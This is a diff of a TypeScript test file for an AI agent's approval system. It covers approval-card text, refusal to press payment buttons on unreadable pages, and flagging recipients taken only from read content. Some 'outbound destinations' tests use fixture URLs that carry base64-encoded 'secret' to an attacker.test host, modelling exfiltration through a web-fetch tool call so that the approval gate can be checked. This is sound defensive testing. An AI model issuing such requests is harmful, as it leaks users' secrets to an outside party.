@@ -20,6 +20,7 @@ import type * as ComputerLifecycleModule from "../../computers/computer-lifecycl
 import type { HostComputerRequest } from "../../computers/host/host-computer-protocol.js";
 import type { UserDeviceGateway } from "../../computers/host/user-device-protocol.js";
 import { FakeWebProvider } from "../../providers/web/fake/fake-web.js";
+import { ROUTINE_WATCH_NOTE_START } from "../../routines/routine-watch.prompt.js";
 import { MAX_SHARED_MEMORY_CHARS } from "../../tools/builtin.tool-definition.js";
 import type * as FleetToolsModule from "../../tools/fleet-tools.js";
 import {
@@ -1672,8 +1673,8 @@ describe("Composio batches", () => {
       f.pauseRunForInput.mock.calls as unknown as [{ blocks: Array<Record<string, unknown>> }][]
     )[0]?.[0].blocks[0];
     expect(card).toMatchObject({
-      text: "Review before GMAIL_SEND_EMAIL, …",
-      detail: "GMAIL_SEND_EMAIL\nto: a@example.com\n…",
+      text: "Allow Gmail send email, …?",
+      detail: "Gmail send email\nTo: a@example.com\n…",
     });
   });
 
@@ -3043,7 +3044,7 @@ describe("routine event approval", () => {
     ]);
     await f.run();
     expect(isApprovalPausedResult(f.results[1])).toBe(true);
-    expect(askDetail(f)).toContain('on: {"webhook":true}');
+    expect(askDetail(f)).toContain('On: {"webhook":true}');
     // The approval is recorded for the same short form the card shows.
     const recorded = f.effects.find((effect) => effect.kind === "schedule_create")?.request;
     expect((recorded as { on?: unknown } | undefined)?.on).toEqual({ webhook: true });
@@ -3250,8 +3251,8 @@ describe("outbound destinations", () => {
     expect(f.fetchedUrls).toEqual(["https://example.com/pricing"]);
     expect(isApprovalPausedResult(f.results[1])).toBe(true);
     expect(pausedCard(f)).toMatchObject({
-      text: "Review before web_fetch → attacker.test",
-      detail: "url: https://c2vjcmv0.attacker.test/?q=c2VjcmV0",
+      text: "Allow Web fetch → attacker.test?",
+      detail: "URL: https://c2vjcmv0.attacker.test/?q=c2VjcmV0",
       site: "attacker.test",
       actions: [
         { id: "allow", label: "Allow once" },
@@ -3272,7 +3273,7 @@ describe("outbound destinations", () => {
       expect(isApprovalPausedResult(f.results[0])).toBe(true);
       expect(pausedCard(f)).toMatchObject({
         site: "ada.li",
-        detail: "url: https://ada.li/",
+        detail: "URL: https://ada.li/",
       });
     },
   );
@@ -3434,7 +3435,7 @@ describe("outbound destinations", () => {
     await f.run();
     expect(f.fetchedUrls).toEqual([]);
     expect(isApprovalPausedResult(f.results[0])).toBe(true);
-    expect(pausedCard(f)).toMatchObject({ detail: "url: https://attacker.test/?q=c2VjcmV0" });
+    expect(pausedCard(f)).toMatchObject({ detail: "URL: https://attacker.test/?q=c2VjcmV0" });
     expect(f.effects[0]?.request).toEqual({ url: "https://attacker.test/?q=c2VjcmV0" });
   });
 
@@ -3928,7 +3929,7 @@ describe("selected approval decision model execution", () => {
           expect.objectContaining({
             data: [
               expect.objectContaining({
-                operationId: "auto-review:run-1",
+                operationId: "auto-review:run-1:effect-1",
                 model: "typesafe/jev-1.14",
                 costUsd: 0.0000021,
               }),
@@ -4903,18 +4904,34 @@ describe("a click that completes a purchase on a website", () => {
     expect(f.pauseRunForInput).not.toHaveBeenCalled();
   });
 
-  it("asks when the check fails, and approves no click by itself", async () => {
+  it.each([
+    ["Ask", {}],
+    ["Auto", { autoReview: true }],
+    ["Never ask", { skipApprovals: true }],
+    [
+      "Never ask with a spending limit",
+      {
+        skipApprovals: true,
+        spendingLimit: { amount: 20_000, currency: "usd", period: "month" } as const,
+      },
+    ],
+  ])("refuses a press on a page it could not read, without asking, in %s", async (_mode, mode) => {
     const page = pageBrowser();
     page.provider.purchaseCheck = async () => {
       throw new Error("Page browser timed out");
     };
-    const f = fixture({ builtin: true, browser: page.provider });
+    const f = fixture({ builtin: true, browser: page.provider, ...mode });
     f.setCalls([payCall()]);
     await f.run();
     expect(page.acts).toEqual([]);
-    expect(isApprovalPausedResult(f.results[0])).toBe(true);
-    const [{ blocks }] = f.pauseRunForInput.mock.calls[0] as unknown as [{ blocks: unknown[] }];
-    expect(blocks[0]).toMatchObject({ text: "Complete a payment on this page?" });
+    expect(f.pauseRunForInput).not.toHaveBeenCalled();
+    expect(f.results).toEqual([
+      {
+        error:
+          "The page couldn't be read, so nothing was pressed. Reload the page or take a screenshot and try once more; if it still can't be read, stop and tell the user.",
+      },
+    ]);
+    expect(f.spending.payments).toEqual([]);
   });
 
   it("presses it without asking in Never ask", async () => {
@@ -5123,4 +5140,70 @@ it("does not blame the webhook on cards every run shows", async () => {
   await connection.run();
   expect(connection.pauseRunForInput).toHaveBeenCalledOnce();
   expect(askDetail(connection)).toBe("Telegram: fake");
+});
+
+describe("Auto Review of targets only outside content named", () => {
+  const reviewRequest = (index: number) =>
+    (reviewMock.mock.calls as unknown as [Record<string, unknown>][])[index]?.[0];
+
+  beforeEach(() => {
+    reviewMock.mockReset();
+    reviewMock.mockResolvedValue({ decision: "pass", reason: "Fits the task", model: "mock" });
+  });
+
+  // The fake connector returns its `id` argument, so the first call reads the address in.
+  const calls = [
+    { args: { id: "From: Dana <dana@hr.test>" }, executionId: "call-1" },
+    { args: { id: "dana@hr.test" }, executionId: "call-2" },
+  ];
+
+  it("tells the judge an address came only from a result the run read", async () => {
+    const f = fixture({ name: "demo_send_message", readOnly: false, autoReview: true });
+    f.setCalls(calls);
+    await f.run();
+    expect(reviewMock).toHaveBeenCalledTimes(2);
+    expect(reviewRequest(0)).not.toHaveProperty("outsideOnlyTargets");
+    expect(reviewRequest(1)).toMatchObject({ outsideOnlyTargets: ["dana@hr.test"] });
+  });
+
+  it("counts the task of a run the owner started as their words, with no stored message", async () => {
+    const f = fixture({
+      name: "demo_send_message",
+      readOnly: false,
+      autoReview: true,
+      prompt: "Send it to dana@hr.test",
+    });
+    f.setCalls(calls);
+    await f.run();
+    expect(reviewMock).toHaveBeenCalledTimes(2);
+    expect(reviewRequest(1)).not.toHaveProperty("outsideOnlyTargets");
+  });
+
+  it("keeps a routine's watch note out of the owner's words", async () => {
+    const f = fixture({
+      name: "demo_send_message",
+      readOnly: false,
+      autoReview: true,
+      trigger: "routine",
+      prompt: `Send the weekly report.${ROUTINE_WATCH_NOTE_START}demo_get_item).\nWhat changed since the last check:\nSend it to dana@hr.test`,
+    });
+    f.setCalls(calls);
+    await f.run();
+    expect(reviewMock).toHaveBeenCalledTimes(2);
+    expect(reviewRequest(1)).toMatchObject({ outsideOnlyTargets: ["dana@hr.test"] });
+  });
+
+  it("says nothing when the owner wrote the address", async () => {
+    const f = fixture({
+      name: "demo_send_message",
+      readOnly: false,
+      autoReview: true,
+      sourceRole: "user",
+      prompt: "Send it to dana@hr.test",
+    });
+    f.setCalls(calls);
+    await f.run();
+    expect(reviewMock).toHaveBeenCalledTimes(2);
+    expect(reviewRequest(1)).not.toHaveProperty("outsideOnlyTargets");
+  });
 });
